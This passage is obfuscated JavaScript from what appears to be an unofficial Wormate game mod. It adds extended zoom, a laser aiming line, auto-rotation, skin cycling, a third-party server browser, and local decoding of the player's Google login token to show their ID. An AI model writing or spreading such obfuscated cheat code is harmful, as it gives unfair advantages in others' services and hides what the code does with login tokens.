      _0xa0ae42.hatId = vps.PropertyManager.oj;
    }
    _0x380234.dh.Cn = 0;
    if (_0x380234.dh.mq) {
      _0x380234.dh.mq.close();
    }
    _0x380234.dh.mq = null;
    _0x380234.dh.Zp = function (_0x55d94a, _0x28bea7) {
      _wup.Zp(vps.con || _0x55d94a, _0x28bea7);
    };
    _0x380234.Pn();
    setTimeout(() => {
      if (vps.PropertyManager && _0xa0ae42) {
        vps.PropertyManager.lj = _0xa0ae42.skinId;
        vps.PropertyManager.mj = _0xa0ae42.eyesId;
        vps.PropertyManager.nj = _0xa0ae42.mouthId;
        vps.PropertyManager.pj = _0xa0ae42.glassesId;
        vps.PropertyManager.oj = _0xa0ae42.hatId;
        const _0x17452a = JSON.parse(localStorage.SaveGameup || "{}");
        _0x17452a.a = _0xa0ae42.skinId;
        _0x17452a.b = _0xa0ae42.eyesId;
        _0x17452a.c = _0xa0ae42.mouthId;
        _0x17452a.d = _0xa0ae42.glassesId;
        _0x17452a.e = _0xa0ae42.hatId;
        localStorage.SaveGameup = JSON.stringify(_0x17452a);
      }
    }, 100);
  };
  $("<button id=\"op_wup\" class=\"op_wup\">⚙️ Settings</button>").insertAfter("#mm-store");
  $("#op_wup").click(function () {
    $("#modal_wup").css("display", "block");
    $("#modal_overlay_wup_fullscreen").css("display", "block");
    _0xfd280a();
  });
  function _0xfd280a() {
    try {
      const _0x4657af = localStorage.getItem("SaveGamewup");
      if (_0x4657af) {
        const _0xb470b5 = JSON.parse(_0x4657af);
        const _0x5d17da = document.getElementById("banned-words-toggle");
        if (_0x5d17da) {
          _0x5d17da.checked = _0xb470b5.bannedWordsEnabled || false;
        }
        const _0x1e76d3 = document.getElementById("laser");
        if (_0x1e76d3) {
          _0x1e76d3.checked = _0xb470b5.laserActive || false;
        }
        const _0x16a328 = document.getElementById("color");
        if (_0x16a328 && _0xb470b5.laserColor) {
          _0x16a328.value = _0xb470b5.laserColor;
        }
        const _0x3cc91b = document.getElementById("range");
        const _0x562e50 = document.getElementById("range-value");
        if (_0x3cc91b && _0xb470b5.laserOpacity) {
          _0x3cc91b.value = _0xb470b5.laserOpacity;
          if (_0x562e50) {
            _0x562e50.textContent = _0xb470b5.laserOpacity;
          }
        }
      }
    } catch (_0x224278) {}
  }
  $(".store-view-cont").append("<div id=\"idReplaceSkin\"></div>");
  $(".wear-view-cont").append("<div id=\"idWearViewCont\"></div>");
  var _0x411ff9 = "display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background-color:transparent;color:white;border-radius:10px;width:890px;height:600px;padding:0px;z-index:99999;box-shadow:0 0 20px rgba(0,0,0,0.5);overflow:hidden;";
  if (_wup.ismobile) {
    _0x411ff9 = "display:none;position:relative;\n background-color:#1e2235;color:white;padding:20px;\n                  width:calc(100vw - var(--scrollbar-width));\n                  height:100vh;";
  }
  $("body").append("<div id=\"modal_overlay_wup_fullscreen\" style=\"display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background-color:rgba(0,0,0,0.5);z-index:9998;\" onclick=\"closeSetView()\"></div>");
  $("body").append("<div id=\"modal_wup\" class=\"modal\" style=\"" + _0x411ff9 + "\"></div>");
  window.gtr = {};
  var _0x129bb0 = function _0x585d66(_0x17631b) {
    if (vps.shiftKey) {
      return;
    }
    var _0x217792 = 30;
    var _0x54d674 = 0;
    var _0x19ef85 = false;
    function _0x3d2242() {
      var _0xe9cb25 = parseFloat(_0x380234.og.af.Bn);
      _0xe9cb25 = (_0xe9cb25 - 0.06) % (Math.PI * 2);
      if (_0xe9cb25 < 0) {
        _0xe9cb25 += Math.PI * 2;
      }
      _0x380234.og.af.Bn = _0xe9cb25.toFixed(2);
    }
    function _0x2ff45c(_0x38efe5) {
      _0x5d648b = setInterval(function () {
        if (_0x38efe5 === 1) {
          _0x54d674 = _0x19ef85 ? _0x54d674 - 1 : _0x54d674 + 1;
          if (_0x54d674 % 80 === 0 && !_0x19ef85) {
            _0x217792 = _0x217792 + 18;
            clearInterval(_0x5d648b);
            _0x2ff45c(1);
          }
        }
        _0x3d2242();
      }, _0x217792);
    }
    if ((_0x17631b == 7 || _0x17631b.key == "7") && _0x5d648b === null) {
      _0x380234.og.af.ng.Eb.removeEventListener("pointermove", gtr.onmovepoint, true);
      _0x2ff45c(1);
      return;
    }
    if ((_0x17631b == 8 || _0x17631b.key == "8") && _0x5d648b === null) {
      _0x380234.og.af.ng.Eb.removeEventListener("pointermove", gtr.onmovepoint, true);
      _0x2ff45c(2);
      return;
    }
    if (_0x5d648b !== null) {
      clearInterval(_0x5d648b);
      _0x380234.og.af.ng.Eb.addEventListener("pointermove", gtr.onmovepoint, true);
      _0x5d648b = null;
    }
  };
  gtr.gtr_laser = false;
  gtr.gtrass1 = function () {
    var _0x2ed8a3 = _0x5f5546 ? 100 : 3;
    var _0x5ae851 = 1.2;
    var _0x80ad37 = _0x1de86b * _0x5ae851;
    if (_0x80ad37 <= _0x2ed8a3) {
      _0x1de86b = _0x80ad37;
    } else {
      _0x1de86b = _0x2ed8a3;
    }
  };
  gtr.gtrass2 = function () {
    var _0x56dd71 = vps.configZoom?.limitDown || 0.25;
    var _0x3d15bb = 1.2;
    var _0x1e132f = _0x1de86b / _0x3d15bb;
    if (_0x1e132f >= _0x56dd71) {
      _0x1de86b = _0x1e132f;
    } else {
      _0x1de86b = _0x56dd71;
    }
  };
  gtr.gtrass3 = function () {
    if (gtr.gtr_rotate) {
      _0x129bb0(8);
      $("#gtr_rotate").css("background-color", "#000");
    } else {
      _0x129bb0(_0x5d648b ? 0 : 8);
    }
    if (_0x5d648b) {
      gtr.gtr_snail = true;
      $("#gtr_snail").css("background-color", "#156ab3");
    } else {
      gtr.gtr_snail = false;
      $("#gtr_snail").css("background-color", "#000");
    }
    setTimeout(() => {
      var _0x493513 = document.getElementById("gtr_snail");
      if (_0x493513) {
        var _0x1b35d2 = _0x493513.querySelector("img");
        if (_0x1b35d2) {
          if (gtr.gtr_snail === true) {
            _0x1b35d2.src = atob(savedImages[3]);
            _0x493513.style.opacity = "1";
          } else {
            _0x1b35d2.src = atob(savedImages[2]);
            _0x493513.style.opacity = "0.25";
          }
        }
      }
    }, 50);
  };
  gtr.gtrass4 = function () {
    if (gtr.gtr_snail) {
      $("#gtr_snail").css("background-color", "#000");
      _0x129bb0(8);
    } else {
      _0x129bb0(_0x5d648b ? 0 : 8);
    }
    if (_0x5d648b) {
      gtr.gtr_rotate = true;
      $("#gtr_rotate").css("background-color", "#156ab3");
    } else {
      gtr.gtr_rotate = false;
      $("#gtr_rotate").css("background-color", "#000");
    }
    setTimeout(() => {
      var _0x2400d3 = document.getElementById("gtr_rotate");
      if (_0x2400d3) {
        var _0x8f5018 = _0x2400d3.querySelector("img");
        if (_0x8f5018) {
          if (gtr.gtr_rotate === true) {
            _0x8f5018.src = atob(savedImages[1]);
            _0x2400d3.style.opacity = "1";
          } else {
            _0x8f5018.src = atob(savedImages[0]);
            _0x2400d3.style.opacity = "0.25";
          }
        }
      }
    }, 50);
  };
  gtr.gtrass5 = function () {
    window.location.reload();
  };
  gtr.gtrass6 = function () {
    respawnFn();
  };
  gtr.gtrass7 = function () {
    _0x1de86b = 1;
  };
  gtr.gtrass9 = function (_0x124970) {
    var _0x4c9fcf = _0x5f5546 ? 100 : 2;
    if (_0x124970.value <= _0x4c9fcf) {
      _0x1de86b = _0x124970.value;
    }
  };
  gtr.gtr_skinr_origin = null;
  gtr.gtr_skinr_current = 0;
  gtr.gtr_skinr_seq = 0;
  gtr.gtr_skinr = function () {
    var _0x9bca09 = Object.keys(vps.skinr || {});
    if (_0x9bca09.length === 0) {
      return;
    }
    if (gtr.gtr_skinr_origin === null) {
      gtr.gtr_skinr_origin = _wup._anApp.On.lj;
    }
    var _0x3e86b0 = _0x9bca09.concat([String(gtr.gtr_skinr_origin)]);
    var _0x50846f = [];
    for (var _0x301e2a = 0; _0x301e2a < _0x3e86b0.length; _0x301e2a++) {
      if (_0x50846f.indexOf(_0x3e86b0[_0x301e2a]) === -1) {
        _0x50846f.push(_0x3e86b0[_0x301e2a]);
      }
    }
    gtr.gtr_skinr_current = _0x50846f[gtr.gtr_skinr_seq % _0x50846f.length];
    gtr.gtr_skinr_seq++;
    _wup._anApp.dh.ch.Eh.Hh = gtr.gtr_skinr_current;
    try {
      if (_wup._anApp.dh.ch.Nm && _wup._anApp.dh.ch.Nm.yc) {
        _wup._anApp.dh.ch.Nm.yc(_wup._anApp.dh.hh.xg, _wup._anApp.Lc.Ub().jb(_wup._anApp.dh.ch.Eh.Gh), _wup._anApp.Lc.Ub().ib(gtr.gtr_skinr_current), _wup._anApp.Lc.Ub().kb(_wup._anApp.dh.ch.Eh.ni), _wup._anApp.Lc.Ub().lb(_wup._anApp.dh.ch.Eh.oi), _wup._anApp.Lc.Ub().mb(_wup._anApp.dh.ch.Eh.pi), _wup._anApp.Lc.Ub().nb(_wup._anApp.dh.ch.Eh.qi), "#ffffff");
      } else {
        _wup._anApp.dh.ch.Sm();
      }
    } catch (_0x1c94b6) {
      console.error("Error applying skin:", _0x1c94b6);
      _wup._anApp.dh.ch.Sm();
    }
  };
  gtr.reset_sequence = function () {
    gtr.gtr_skinr_seq = 0;
  };
  gtr.gtrass12 = function () {
    var _0x183226 = _wup._anApp.og.af.ng.mf.getChildByName("lineHS");
    if (_0x183226) {
      vps.laserActive = !vps.laserActive;
      if (vps.laserActive) {
        _0x183226.alpha = vps.laserOpacity || 0.3;
        gtr.gtr_laser = true;
      } else {
        _0x183226.alpha = 0;
        gtr.gtr_laser = false;
      }
    }
    gtr.updateLaserButton();
  };
  gtr.updateLaserButton = function () {
    var _0x2a1dae = document.getElementById("gtr_laser");
    if (_0x2a1dae) {
      var _0x547cfe = _0x2a1dae.querySelector("img");
      if (_0x547cfe) {
        if (gtr.gtr_laser === true) {
          _0x547cfe.src = atob(savedImages[86]);
          _0x2a1dae.style.opacity = "1";
          _0x2a1dae.classList.add("active");
        } else {
          _0x547cfe.src = atob(savedImages[85]);
          _0x2a1dae.style.opacity = "0.25";
          _0x2a1dae.classList.remove("active");
        }
      }
    }
  };
  gtr.switchJoystickType = function () {
    switch (vps.joystickType) {
      case 1:
        vps.joystickType = 6;
        break;
      case 6:
        vps.joystickType = 4;
        break;
      case 4:
        vps.joystickType = 5;
        break;
      case 5:
        vps.joystickType = 2;
        break;
      case 2:
        vps.joystickType = 3;
        break;
      case 3:
        vps.joystickType = 1;
        break;
      default:
        vps.joystickType = 1;
    }
    localStorage.setItem("SaveGamewup", JSON.stringify(vps));
    gtr.updateJoystickSwitchButton();
    gtr.clearAllJoystickElements();
    if (_wup.ismobile) {
      setTimeout(() => {
        _0x504f56();
      }, 100);
    }
  };
  gtr.clearAllJoystickElements = function () {
    if (_0x247e3c) {
      _0x247e3c.destroy();
      _0x247e3c = null;
    }
    _0x1f464a();
    const _0xb707bf = ["img_1", "img_2", "img_3", "img_4", "img_o_2", "img_o_3", "img_o_4", "img_i_2", "img_i_3", "img_p_1", "img_p_2", "img_p_3", "img_p_4", "img_p_5", "img_f", "img_pf_1"];
    _0xb707bf.forEach(_0x9b0ff0 => {
      const _0x49fe6c = document.getElementById(_0x9b0ff0);
      if (_0x49fe6c && _0x49fe6c.parentNode) {
        _0x49fe6c.parentNode.removeChild(_0x49fe6c);
      }
    });
  };
  if (vps.activeZoom) {
    window.addEventListener("wheel", function (_0x3a13db) {
      var _0xe95351 = _0x5f5546 ? 100 : 3;
      var _0xf824a9 = vps.configZoom?.limitDown || 0.25;
      var _0x319b78 = _0x3a13db.deltaY < 0;
      var _0x3c383c;
      var _0x18513b;
      if (_0x1de86b > 10) {
        _0x3c383c = 1.08;
        _0x18513b = 1.12;
      } else {
        _0x3c383c = 1.15;
        _0x18513b = 1.2;
      }
      var _0x593c30;
      if (_0x319b78) {
        _0x593c30 = _0x1de86b * _0x3c383c;
      } else {
        _0x593c30 = _0x1de86b / _0x18513b;
      }
      if (_0x593c30 >= _0xf824a9 && _0x593c30 <= _0xe95351) {
        _0x1de86b = _0x593c30;
      } else {
        if (_0x593c30 < _0xf824a9) {
          _0x1de86b = _0xf824a9;
        }
        if (_0x593c30 > _0xe95351) {
          _0x1de86b = _0xe95351;
        }
      }
    }, {
      passive: false
    });
  }
  $("#mm-advice-cont").html("<div class=\"div_FullScreen\">\n    <input type=\"button\" value=\"RESPAWN\" id=\"btnRePlay\" onclick=\"respawnFn()\" />\n    <input type=\"button\" value=\"FullScreen\" id=\"btnFullScreen\" />\n    \n    </div>");
  var _0x2ca174 = $("#idReplaceSkin");
  var _0x62a18c = function () {
    var _0x371a69 = _0x16316f(_0x51aacb().mark(function _0x1fa519(_0x2465c3, _0x4d1275) {
      return _0x51aacb().wrap(function _0x5da4c9(_0x5e26e7) {
        while (1) {
          switch (_0x5e26e7.prev = _0x5e26e7.next) {
            case 0:
              if (!_0x4d1275) {
                _0x5e26e7.next = 2;
                break;
              }
              return _0x5e26e7.abrupt("return");
            case 2:
              if (!_0x2465c3) {
                _0x2465c3 = _0x380234.u.wi;
              }
              vps.userId = _0x2465c3.userId;
              _0x5e26e7.next = 7;
              if (_0x2465c3.type === "error") {
                $(".description-text").html(_0x2465c3.msg);
              } else {
                window.currentDisplayMode = "timmap";
                if (typeof window.servers === "undefined") {
                  window.servers = {
                    Api_listServer: []
                  };
                }
                function _0x4d47bc() {
                  try {
                    const _0x57fb8b = localStorage.getItem("cachedServers");
                    if (_0x57fb8b) {
                      const _0x2311b1 = JSON.parse(_0x57fb8b);
                      const _0x47220a = _0x2311b1.timestamp;
                      const _0x3129ed = new Date().getTime();
                      if (_0x3129ed - _0x47220a < 3600000) {
                        window.servers = _0x2311b1.data;
                        return true;
                      }
                    }
                  } catch (_0x267fbf) {
                    console.error("خطأ في تحميل البيانات المحفوظة:", _0x267fbf);
                  }
                  return false;
                }
                async function _0x41be09() {
                  try {
                    const _0x5b5d6a = await fetch(window.vps.s_l + "/servers");
                    if (_0x5b5d6a.ok) {
                      const _0x120384 = await _0x5b5d6a.json();
                      if (_0x120384.success && Array.isArray(_0x120384.servers)) {
                        window.servers.Api_listServer = _0x120384.servers.filter(_0x3c29ec => _0x3c29ec.serverUrl);
                        try {
                          const _0x1343a1 = {
                            timestamp: new Date().getTime(),
                            data: window.servers
                          };
                          localStorage.setItem("cachedServers", JSON.stringify(_0x1343a1));
                        } catch (_0xde3585) {
                          console.warn("فشل في حفظ البيانات:", _0xde3585);
                        }
                        return true;
                      }
                    }
                  } catch (_0x2e9d52) {
                    console.error("خطأ في تحميل السيرفرات:", _0x2e9d52);
                  }
                  return false;
                }
                function _0x3eb763() {
                  return "\n                <div class=\"title-wormate-server\">S E R V E R S</div>\n                <div class=\"description-text-hiep\">\n                    <div style=\"position:sticky; top:0; z-index:100; background:#242424;\">\n                        <br>\n                        <ul style=\"margin-top:5px\" class=\"ui-tabs-nav\">\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive0 ui-tab-active\" style=\"margin:-5px\">\n                               <a><span class=\"flag br\" value=\"" + atob(savedImages[70]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive1\" style=\"margin:-5px\">\n                               <a><span class=\"flag mx\" value=\"" + atob(savedImages[71]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive2\" style=\"margin:-5px\">\n                               <a><span class=\"flag us\" value=\"" + atob(savedImages[72]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive3\" style=\"margin:-5px\">\n                               <a><span class=\"flag ca\" value=\"" + atob(savedImages[73]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive4\" style=\"margin:-5px\">\n                               <a><span class=\"flag de\" value=\"" + atob(savedImages[74]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive5\" style=\"margin:-5px\">\n                               <a><span class=\"flag fr\" value=\"" + atob(savedImages[75]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive6\" style=\"margin:-5px\">\n                               <a><span class=\"flag sg\" value=\"" + atob(savedImages[76]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive7\" style=\"margin:-5px\">\n                               <a><span class=\"flag jp\" value=\"" + atob(savedImages[77]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive8\" style=\"margin:-5px\">\n                               <a><span class=\"flag au\" value=\"" + atob(savedImages[78]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive9\" style=\"margin:-5px\">\n                               <a><span class=\"flag gb\" value=\"" + atob(savedImages[79]) + "\"></span></a>\n                           </li>\n                        </ul>\n                        \n                        <div style=\"text-align: center; margin: 2px 0; padding: 2px;\">\n                            <button id=\"sort-toggle\" style=\"font-size: 10px; padding: 1px 6px; background-color: #333; color: #ddd; border: 1px solid #666; border-radius: 3px; cursor: pointer; outline: none;\">Timmap Servers</button>\n                        </div>\n                        \n                        <div class=\"gachngang\"></div>\n                        <div class=\"server-header\">\n                            <div class=\"header-name\">SERVER</div>\n                            <div class=\"header-region\">REGION</div>\n                            <div class=\"header-status\">STATUS</div>\n                            <div class=\"header-score\">SCORE</div>\n                        </div>\n                        <div class=\"gachngang\"></div>\n                    </div>\n                    \n                    <div class=\"background-image-container\">\n                        <img src=\"" + window.vps.s_l + "/images/Background/serverbg.jpg\" class=\"background-image\">\n                    </div>\n                    \n                    <div class=\"servers-container\">\n                        <div class=\"servers-de\"></div>\n                        <div class=\"servers-uae\" style=\"display:none\"></div>\n                        <div class=\"servers-us\" style=\"display:none\"></div>\n                        <div class=\"servers-ca\" style=\"display:none\"></div>\n                        <div class=\"servers-br\" style=\"display:none\"></div>\n                        <div class=\"servers-fr\" style=\"display:none\"></div>\n                        <div class=\"servers-sg\" style=\"display:none\"></div>\n                        <div class=\"servers-jp\" style=\"display:none\"></div>\n                        <div class=\"servers-gb\" style=\"display:none\"></div>\n                        <div class=\"servers-au\" style=\"display:none\"></div>\n                    </div>\n                </div>\n            ";
                }
                const _0x6efff5 = {
                  br: atob(savedImages[70]),
                  mx: atob(savedImages[71]),
                  us: atob(savedImages[72]),
                  ca: atob(savedImages[73]),
                  de: atob(savedImages[74]),
                  fr: atob(savedImages[75]),
                  sg: atob(savedImages[76]),
                  jp: atob(savedImages[77]),
                  au: atob(savedImages[78]),
                  gb: atob(savedImages[79]),
                  default: atob(savedImages[80])
                };
                function _0x1cc136(_0x3052fc) {
                  const _0x8db326 = {
                    br: "br",
                    us: "us",
                    au: "gb",
                    ca: "ca",
                    jp: "jp",
                    gb: "au",
                    sg: "sg",
                    fr: "fr",
                    uae: "mx",
                    default: "de"
                  };
                  const _0x410955 = _0x8db326[_0x3052fc] || _0x8db326.default;
                  return _0x6efff5[_0x410955] || _0x6efff5.default;
                }
                function _0x51e75a() {
                  if (!window.servers || !window.servers.Api_listServer || window.servers.Api_listServer.length === 0) {
                    return;
                  }
                  const _0x2e0520 = {
                    de: {
                      code: "DE",
                      container: "servers-de"
                    },
                    uae: {
                      code: "UAE",
                      container: "servers-uae"
                    },
                    us: {
                      code: "US",
                      container: "servers-us"
                    },
                    ca: {
                      code: "LT",
                      container: "servers-ca"
                    },
                    br: {
                      code: "BR",
                      container: "servers-br"
                    },
                    fr: {
                      code: "FR",
                      container: "servers-fr"
                    },
                    sg: {
                      code: "SG",
                      container: "servers-sg"
                    },
                    jp: {
                      code: "JP",
                      container: "servers-jp"
                    },
                    gb: {
                      code: "IN",
                      container: "servers-gb"
                    },
                    au: {
                      code: "UK",
                      container: "servers-au"
                    }
                  };
                  Object.values(_0x2e0520).forEach(_0x357d1c => {
                    $("." + _0x357d1c.container).empty();
                  });
                  let _0x9f405e = window.currentDisplayMode || "timmap";
                  const _0x1ca32f = {};
                  Object.keys(_0x2e0520).forEach(_0x1554b4 => {
                    _0x1ca32f[_0x1554b4] = [];
                  });
                  window.servers.Api_listServer.forEach(_0x4bec76 => {
                    let _0xda216d = null;
                    if (_0x9f405e === "timmap" && _0x4bec76.timmap) {
                      _0xda216d = _0x4bec76.timmap;
                    } else if (_0x9f405e === "wormworld" && _0x4bec76.wormworld) {
                      _0xda216d = _0x4bec76.wormworld;
                    }
                    if (_0xda216d && _0x1ca32f[_0x4bec76.region]) {
                      _0x4bec76.displayNumber = _0xda216d;
                      _0x1ca32f[_0x4bec76.region].push(_0x4bec76);
                    }
                  });
                  Object.keys(_0x1ca32f).forEach(_0x1ce7c9 => {
                    const _0x333e8a = _0x1ca32f[_0x1ce7c9];
                    const _0x5618d7 = _0x2e0520[_0x1ce7c9];
                    if (_0x333e8a.length > 0) {
                      _0x333e8a.sort((_0x7aea22, _0x5a2a51) => (_0x7aea22.displayNumber || 0) - (_0x5a2a51.displayNumber || 0));
                      _0x333e8a.forEach(_0x4ce787 => {
                        const _0x3f1e59 = _0x4ce787.displayNumber;
                        const _0x17635f = _0x4ce787.name || "WW";
                        const _0x2b5830 = _0x4ce787.image || atob(savedImages[80]);
                        const _0x5b5426 = _0x5618d7.code + " " + _0x3f1e59;
                        const _0x23240d = "" + _0x3f1e59 + _0x1ce7c9.substring(0, 2);
                        const _0x10738b = "\n                            <div class=\"selectSala\" \n                                 id=\"" + _0x1ce7c9 + "\" \n                                 value=\"" + _0x4ce787.serverUrl + "\" \n                                 data-server-name=\"" + _0x17635f + "\" \n                                 data-region-name=\"" + _0x5618d7.code + "\" \n                                 data-region-flag=\"" + _0x1cc136(_0x1ce7c9) + "\"\n                                 data-server-number=\"" + _0x3f1e59 + "\" \n                                 data-server-image=\"" + _0x2b5830 + "\"\n                                 data-con=\"" + _0x4ce787.serverUrl + "\" \n                                 data-room=\"" + _0x5b5426 + "\"\n                                 data-type=\"false\">\n                                <div class=\"server-image\">\n                                    <img src=\"" + _0x2b5830 + "\" alt=\"" + _0x17635f + "\">\n                                </div>\n                                <div class=\"server-info\">\n                                    <span class=\"server-number\" style=\"color: " + (_0x9f405e === "wormworld" ? "#00a8ff" : "#f00") + "\">" + _0x3f1e59 + ".</span>\n                                    <span class=\"server-name\">" + _0x17635f + "</span>\n                                </div>\n                                <div class=\"server-region\">" + _0x5b5426 + "</div>\n                                <div class=\"server-status\">\n                                    <span class=\"green-dot\"></span>\n                                </div>\n                                <div class=\"server-score\">-</div>\n                            </div>\n                        ";
                        $("." + _0x5618d7.container).append(_0x10738b);
                        $("." + _0x5618d7.container + " .selectSala:last").addClass("selecionar-sala-v2");
                        $("." + _0x5618d7.container + " .selectSala:last").addClass("dropdown-item");
                        $("." + _0x5618d7.container + " .selectSala:last").css("cursor", "pointer");
                      });
                    } else {
                      $("." + _0x5618d7.container).append("\n                        <div style=\"text-align:center; padding:20px; color:#aaa;\">\n                            No servers available in this region\n                        </div>\n                    ");
                    }
                  });
                  if (typeof _wup.load_con === "function") {
                    _wup.load_con();
                  }
                  setTimeout(_0x5c0eed, 1000);
                }
                function _0x5c0eed() {
                  fetch(window.vps.s_l + "/wormate1-api.php?t=" + Date.now()).then(_0x48014b => _0x48014b.json()).then(_0x448e36 => {
                    if (_0x448e36 && Array.isArray(_0x448e36)) {
                      $(".selectSala").each(function () {
                        const _0x4accce = $(this);
                        const _0x24952a = _0x4accce.attr("value");
                        const _0x223709 = _0x448e36.find(_0x1d140c => _0x1d140c.serverUrl === _0x24952a);
                        if (_0x223709 && _0x223709.players && _0x223709.players.length > 0) {
                          const _0x238728 = _0x223709.players[0];
                          const _0x2a3b2e = _0x32d0a3(_0x238728.score);
                          const _0x3641df = _0x238728.score >= 1000000;
                          _0x4accce.find(".server-score").html("<span class=\"score-display " + (_0x3641df ? "million" : "regular") + "\">" + _0x2a3b2e + "</span>");
                          const _0x526150 = _0x223709.players.filter(_0x568fb0 => _0x568fb0.score >= 1000000).length;
                          if (_0x526150 >= 4) {
                            _0x4accce.find(".green-dot").css("display", "block");
                          }
                          _0x4accce.data("players", JSON.stringify(_0x223709.players));
                        } else {
                          _0x4accce.find(".server-score").html("-");
                          _0x4accce.find(".green-dot").css("display", "none");
                        }
                      });
                    }
                  }).catch(_0x13f7ea => console.error("خطأ في جلب بيانات السيرفرات:", _0x13f7ea));
                }
                function _0x32d0a3(_0x3ad072) {
                  if (_0x3ad072 >= 1000000) {
                    return (_0x3ad072 / 1000000).toFixed(2) + "M";
                  } else if (_0x3ad072 >= 1000) {
                    return (_0x3ad072 / 1000).toFixed(1) + "K";
                  } else {
                    return _0x3ad072.toFixed(0);
                  }
                }
                function _0x507b9b() {
                  const _0x5e8c95 = {
                    mx: "servers-uae",
                    br: "servers-de",
                    us: "servers-us",
                    ca: "servers-ca",
                    de: "servers-br",
                    fr: "servers-fr",
                    sg: "servers-sg",
                    jp: "servers-jp",
                    au: "servers-gb",
                    gb: "servers-au"
                  };
                  $(".flag").off("click");
                  Object.keys(_0x5e8c95).forEach((_0x3c7cf0, _0x4c5618) => {
                    $(".flag." + _0x3c7cf0).on("click", function (_0x82adb5) {
                      _0x82adb5.preventDefault();
                      _0x82adb5.stopPropagation();
                      $(".ui-tabs-nav .ui-tab").removeClass("ui-tab-active");
                      $(this).closest(".ui-tab").addClass("ui-tab-active");
                      $(".servers-de, .servers-uae, .servers-us, .servers-ca, .servers-br, .servers-fr, .servers-sg, .servers-jp, .servers-gb, .servers-au").hide();
                      $("." + _0x5e8c95[_0x3c7cf0]).fadeIn(300);
                      let _0x4a0b12 = $(this).attr("value");
                      if (typeof window.theoKzObjects !== "undefined") {
                        window.theoKzObjects.flag = _0x4a0b12;
                      }
                    });
                  });
                }
                function _0x17e3b4() {
                  $("body").append("<div id=\"custom-tooltip\" style=\"display: none; position: absolute; z-index: 9999; background: rgba(0,0,0,0.9); padding: 5px 10px; border-radius: 4px; font-size: 10px; pointer-events: none; text-align: center;\"><div style=\"display: flex; justify-content: space-between; align-items: center;\"><span style=\"color: #ffd700; text-align: right;\">TimMap Servers </span><span style=\"color: white; margin: 0 5px;\">⟷ </span><span style=\"color: #ffd700; text-align: left;\">WormWorld Servers</span></div></div>");
                  $("#sort-toggle").off("click mouseenter mouseleave");
                  $("#sort-toggle").on({
                    mouseenter: function (_0x11d0fa) {
                      var _0x230156 = $("#custom-tooltip");
                      var _0x556df2 = $(this).offset();
                      var _0x14cdbb = $(this).outerWidth();
                      var _0x4da3d1 = _0x230156.outerWidth();
                      _0x230156.css({
                        left: _0x556df2.left + _0x14cdbb / 2 - _0x4da3d1 / 2,
                        top: _0x556df2.top + 30
                      }).fadeIn(200);
                    },
                    mouseleave: function () {
                      $("#custom-tooltip").fadeOut(200);
                    }
                  });
                  $("#sort-toggle").click(function () {
                    if (window.currentDisplayMode === "timmap") {
                      window.currentDisplayMode = "wormworld";
                      $(this).addClass("wormworld").text("WormWorld Servers");
                    } else {
                      window.currentDisplayMode = "timmap";
                      $(this).removeClass("wormworld").text("Timmap Servers");
                    }
                    _0x51e75a();
                  });
                }
                async function _0x1d921c() {
                  $(".description-text").html(_0x3eb763());
                  const _0x3363d9 = _0x4d47bc();
                  if (_0x3363d9) {
                    _0x51e75a();
                    _0x507b9b();
                    _0x17e3b4();
                  }
                  const _0x214fe1 = await _0x41be09();
                  if (_0x214fe1 && !_0x3363d9) {
                    _0x51e75a();
                    _0x507b9b();
                    _0x17e3b4();
                  } else if (_0x214fe1 && _0x3363d9) {
                    _0x51e75a();
                  }
                  if (!_0x3363d9 && !_0x214fe1) {
                    $(".description-text").html("🎮 Failed to load servers. Please try again later.");
                  }
                  setInterval(() => {
                    _0x41be09().then(_0x53232b => {
                      if (_0x53232b) {
                        _0x51e75a();
                      }
                    });
                  }, 300000);
                }
                _0x1d921c();
              }
              function _0x598999(_0x103821) {
                try {
                  if (_0x103821 && _0x103821.startsWith("gg_")) {
                    const _0x51678c = _0x103821.replace("gg_", "");
                    const _0x37bbbc = JSON.parse(atob(_0x51678c.split(".")[1]));
                    return "gg_" + _0x37bbbc.sub;
                  }
                  if (_0x103821 && _0x103821.startsWith("fb_")) {
                    return _0x103821;
                  }
                  return _0x103821;
                } catch (_0x44d979) {
                  return "غير متوفر";
                }
              }
              window.copyUserIdToClipboard = function () {
                const _0x58aa49 = _0x598999(vps.wuid || window.wup_keycode);
                navigator.clipboard.writeText(_0x58aa49).then(function () {
                  alert("Your ID " + _0x58aa49 + " copied!");
                }).catch(function () {
                  const _0x173a8c = document.createElement("textarea");
                  _0x173a8c.value = _0x58aa49;
                  document.body.appendChild(_0x173a8c);
                  _0x173a8c.select();
                  document.execCommand("copy");
                  document.body.removeChild(_0x173a8c);
                  alert("Your ID " + _0x58aa49 + " copied!");
                });
              };
              const _0x31199f = _0x598999(vps.wuid || window.wup_keycode);
              $(".profile-user").append("<div class=\"idwormate\" style=\"margin-left: 20px; margin-top: -35px;\"><input type=\"text\" value=\"" + _0x31199f + "\" style=\"max-width: 300px; width: 350px !important; height: 22px !important; border-radius: 6px; font-size: 14px; text-align: center; background-color: #fff; color: #0a6928; font-weight: 630; display: inline-block; margin-right: 10px;\" readonly/><button id=\"btn_copy_user_id\" style=\"width: 100px; height: 35px; border-radius: 6px; font-size: 15px; background-color: #4CAF50; color: white; border: none; cursor: pointer;\">Copy</button></div>");
              $("#btn_copy_user_id").click(function () {
                window.copyUserIdToClipboard();
              });
              function _0x3b8fb0(_0x277b7e) {
                try {
                  if (_0x277b7e && _0x277b7e.startsWith("gg_")) {
                    const _0x336e56 = _0x277b7e.replace("gg_", "");
                    const _0x4ed1ca = JSON.parse(atob(_0x336e56.split(".")[1]));
